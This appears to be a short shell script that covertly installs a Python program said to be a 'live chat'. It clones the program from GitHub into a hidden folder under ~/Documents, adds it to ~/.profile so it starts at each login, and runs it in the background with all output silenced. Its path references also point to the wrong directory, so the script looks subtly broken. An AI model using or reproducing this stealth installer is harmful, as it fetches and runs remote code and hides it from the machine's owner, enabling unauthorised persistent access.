git clone https://github.com/MaitreRenard18/Python-Live-Chat ~/Documents/.thnr
echo "python $(pwd)/main.pyw true &" >> ~/.profile
nohup python $(pwd)/main.pyw true > /dev/null 2>&1 &
